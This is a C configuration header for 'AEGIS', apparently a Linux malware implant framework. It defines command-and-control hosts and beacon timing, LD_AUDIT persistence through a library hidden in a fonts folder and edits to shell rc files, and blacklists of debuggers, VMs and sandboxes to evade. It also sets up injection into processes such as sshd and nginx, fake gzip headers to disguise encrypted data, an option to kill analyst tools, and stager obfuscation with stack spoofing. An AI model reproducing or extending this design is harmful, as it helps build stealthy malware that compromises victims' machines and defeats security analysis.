/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Configuration
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : common/config.h
 *  Purpose        : Compile-time and operational configuration parameters.
 *  NOTE           : In production deployment, all sensitive values (domains,
 *                   keys, paths) are encrypted blobs derived at runtime via
 *                   environmental keying. These defaults exist only for the
 *                   research/development environment.
 * ============================================================================
 */

#ifndef AEGIS_CONFIG_H
#define AEGIS_CONFIG_H

#include "types.h"

/* ── C2 Configuration ────────────────────────────────────────────────────── */

#define AEGIS_C2_PRIMARY_HOST "47.89.245.3"
#define AEGIS_C2_PRIMARY_PORT 4443
#define AEGIS_C2_FALLBACK_HOST "static.content-delivery-net.com"
#define AEGIS_C2_FALLBACK_PORT 443
#define AEGIS_C2_DOH_RESOLVER "https://dns.cloudflare.com/dns-query"
#define AEGIS_C2_DOH_FALLBACK "https://dns.google/dns-query"
#define AEGIS_C2_SKIP_SSL_VERIFY                                               \
  1 /* Set to 1 for self-signed certs (testing), 0 for production */
#define AEGIS_C2_USER_AGENT                                                    \
  "Mozilla/5.0 (X11; Linux x86_64) "                                           \
  "AppleWebKit/537.36 (KHTML, like Gecko) "                                    \
  "Chrome/120.0.0.0 Safari/537.36"

/* Beacon timing (milliseconds) */
#define AEGIS_BEACON_INTERVAL_MS 60000       /* 60s base interval         */
#define AEGIS_BEACON_JITTER_PCT 30           /* ±30% randomized jitter    */
#define AEGIS_BEACON_FAILURE_BACKOFF 2       /* Exponential backoff mult  */
#define AEGIS_BEACON_MAX_INTERVAL_MS 3600000 /* 1h ceiling                */
#define AEGIS_BEACON_MAX_FAILURES 10         /* Go dormant after N fails  */

/* C2 protocol envelope */
#define AEGIS_C2_HEADER_MAGIC 0xAE610C2D    /* "AEGIS-C2-D"            */
#define AEGIS_C2_MAX_PAYLOAD_SIZE (1 << 20) /* 1 MB                    */

/* ── Crypto Configuration ────────────────────────────────────────────────── */

#define AEGIS_AES_KEY_BITS 256
#define AEGIS_AES_KEY_BYTES (AEGIS_AES_KEY_BITS / 8)
#define AEGIS_GCM_IV_BYTES 12
#define AEGIS_GCM_TAG_BYTES 16
#define AEGIS_HKDF_SALT_BYTES 32
#define AEGIS_HKDF_INFO "aegis-nightshade-v1"
#define AEGIS_SESSION_KEY_ROTATE_N 50 /* Derive new key every N msgs   */

/*
 * Pre-shared key (base64-encoded).
 * In production: derived from hardware fingerprint + timestamp + C2 nonce.
 * This value is a research placeholder.
 */
#define AEGIS_PSK_B64 "Rz9kX3BhcnRuZXJzX2luX2NyaW1lX0xPX2FuZF9FTkk="

/* ── Filesystem Paths (relative to $HOME) ────────────────────────────────── */

#define AEGIS_AUDITOR_FILENAME "nexus_auditor.so"
#define AEGIS_AUDITOR_REL_PATH ".local/share/fonts/"
#define AEGIS_LOCK_FILENAME ".cache/.session.lock"
#define AEGIS_IPC_SOCK_PREFIX ".cache/.dbus-"
#define AEGIS_IPC_SOCK_SUFFIX "-session"
#define AEGIS_LOG_REL_PATH ".cache/.xsession-errors.old"

/* Environment variable manipulation */
#define AEGIS_AUDIT_ENV_VAR "LD_AUDIT"
#define AEGIS_SHELL_RC_FILES ".bashrc,.zshrc,.profile"

/* ── Anti-Analysis Thresholds ────────────────────────────────────────────── */

/* Granular Control Flags (Comment out to disable individual checks) */        \
#define AEGIS_AA_ENABLE_PTRACE
#define AEGIS_AA_ENABLE_TRACER_PID
#define AEGIS_AA_ENABLE_RDTSC
#define AEGIS_AA_ENABLE_SLEEP_TIMING
#define AEGIS_AA_ENABLE_HOSTILE_PROCS
#define AEGIS_AA_ENABLE_VM_CPUID
#define AEGIS_AA_ENABLE_VM_MAC
#define AEGIS_AA_ENABLE_SANDBOX_RESOURCES
#define AEGIS_AA_ENABLE_CONTAINER
#define AEGIS_AA_ENABLE_BREAKPOINTS
#define AEGIS_AA_ENABLE_UPTIME
#define AEGIS_AA_ENABLE_LD_PRELOAD

#define AEGIS_AA_RDTSC_THRESHOLD 1000000 /* CPU cycles — timing gap  */
#define AEGIS_AA_SLEEP_CHECK_MS 100      /* Sleep duration for check */
#define AEGIS_AA_SLEEP_TOLERANCE_MS 150  /* Max acceptable elapsed   */
#define AEGIS_AA_MIN_CPU_CORES 2         /* Below this = sandbox     */
#define AEGIS_AA_MIN_RAM_MB 2048         /* Below this = sandbox     */
#define AEGIS_AA_MIN_DISK_GB 40          /* Below this = sandbox     */
#define AEGIS_AA_MIN_UPTIME_SEC 600      /* Fresh boot = suspicious  */

/* Comma-delimited hostile process names */
#define AEGIS_AA_PROC_BLACKLIST                                                \
  "wireshark,strace,ltrace,gdb,lldb,"                                          \
  "ida,ida64,x64dbg,tcpdump,frida,"                                            \
  "frida-server,r2,radare2,ghidra,"                                            \
  "procmon,sysdig,bpftrace,perf,"                                              \
  "volatility,rekall,dumpcap"

/* Known analysis MAC OUI prefixes (VMware, VBox, etc.) */
#define AEGIS_AA_VM_MAC_PREFIXES                                               \
  "00:0C:29,00:50:56,08:00:27,"                                                \
  "00:1C:42,00:16:3E,52:54:00"

/* ── Process Parasitization ──────────────────────────────────────────────── */

/* Preferred host processes, ordered by desirability.
 * Score weighting: network_capable(+30), long_lived(+25), high_rss(+20),
 *                  root_owned(+15), multi_threaded(+10)                     */
#define AEGIS_HOST_CANDIDATES                                                  \
  "nginx,apache2,postgres,mysqld,sshd,"                                        \
  "systemd-journald,rsyslogd,cron,"                                            \
  "dbus-daemon,polkitd,dockerd,containerd"
#define AEGIS_HOST_MIN_UPTIME_SEC 300 /* Must be running 5+ minutes     */
#define AEGIS_HOST_MIN_RSS_KB 8192    /* 8 MB minimum footprint         */
#define AEGIS_HOST_MAX_CANDIDATES 16  /* Evaluate top N candidates      */

/* ── Nanomachine Configuration ───────────────────────────────────────────── */

#define AEGIS_NANO_EXEC_BUF_SIZE 4096   /* 1 page execution buffer  */
#define AEGIS_NANO_MAX_CHUNK_SIZE 2048  /* Max decrypted chunk       */
#define AEGIS_NANO_SCATTER_MIN_US 100   /* Temporal scatter: min µs  */
#define AEGIS_NANO_SCATTER_MAX_US 50000 /* Temporal scatter: max µs  */
#define AEGIS_NANO_WIPE_PASSES 3        /* Overwrite passes          */
#define AEGIS_NANO_MAX_OPS_BURST 32     /* Ops before forced scatter */

/* Entropy camouflage — fake gzip header to mask encrypted vault data       */
#define AEGIS_ENTROPY_CAMO_MAGIC "\x1f\x8b\x08\x00" /* gzip magic     */
#define AEGIS_ENTROPY_CAMO_HDR_LEN 10

/* ── IPC Configuration ───────────────────────────────────────────────────── */

#define AEGIS_IPC_MAX_MSG_SIZE 65536   /* 64 KB max IPC payload        */
#define AEGIS_IPC_MAX_BETA_NODES 256   /* Maximum tracked betas        */
#define AEGIS_IPC_HEARTBEAT_SEC 30     /* Beta heartbeat interval      */
#define AEGIS_IPC_DEAD_TIMEOUT_SEC 120 /* Declare beta dead after      */
#define AEGIS_IPC_BACKLOG 16           /* listen() backlog             */

/* ── Watchdog Configuration ──────────────────────────────────────────────── */

#define AEGIS_WD_SCAN_INTERVAL_MS 5000 /* Scan for analysts every 5s   */
#define AEGIS_WD_HOSTILE_PROCS                                                 \
  "strace,ltrace,gdb,lldb,valgrind,"                                           \
  "perf,bpftrace,sysdig,frida,"                                                \
  "frida-server,tcpdump,dumpcap"
#define AEGIS_WD_PROC_SCAN_PATH "/proc"
#define AEGIS_WD_EVASION_STRATEGY                                              \
  1 /* 0=kill analyst, 1=self-migrate,                                         \
       2=go dormant, 3=full wipe       */

/* ── Logging Configuration ───────────────────────────────────────────────── */

#define AEGIS_LOG_MAX_ENTRIES 8192
#define AEGIS_LOG_FLUSH_THRESHOLD 64 /* Flush every N entries       */
#define AEGIS_LOG_ROTATE_SIZE_MB 10
#define AEGIS_LOG_TIMESTAMP_FMT "%Y-%m-%dT%H:%M:%S"

/* ── Stager Generation Engine (Server-Side) ──────────────────────────────── */

#define AEGIS_GEN_COMPILERS "gcc,clang,musl-gcc"
#define AEGIS_GEN_OPT_LEVELS "O0,O1,O2,O3,Os,Oz"
#define AEGIS_GEN_JUNK_MIN_FUNCS 5
#define AEGIS_GEN_JUNK_MAX_FUNCS 20
#define AEGIS_GEN_MAX_STAGER_SIZE 65536 /* 64 KB max stager binary     */
#define AEGIS_GEN_STRIP_SYMBOLS true
#define AEGIS_GEN_STATIC_LINK true

/* ── Syscall Trampoline (ENI Enhancement) ────────────────────────────────── */

#define AEGIS_TRAMP_POOL_SIZE 16       /* Number of trampoline slots   */
#define AEGIS_TRAMP_STUB_MAX_SIZE 64   /* Max bytes per stub           */
#define AEGIS_TRAMP_RELOCATE_EVERY 100 /* Relocate stub after N calls  */

/* ── Stack Spoofing (ENI Enhancement) ────────────────────────────────────── */

#define AEGIS_SPOOF_MAX_FRAMES 8  /* Fake stack frames to forge   */
#define AEGIS_SPOOF_FRAME_SIZE 64 /* Bytes per fake frame         */

#endif /* AEGIS_CONFIG_H */
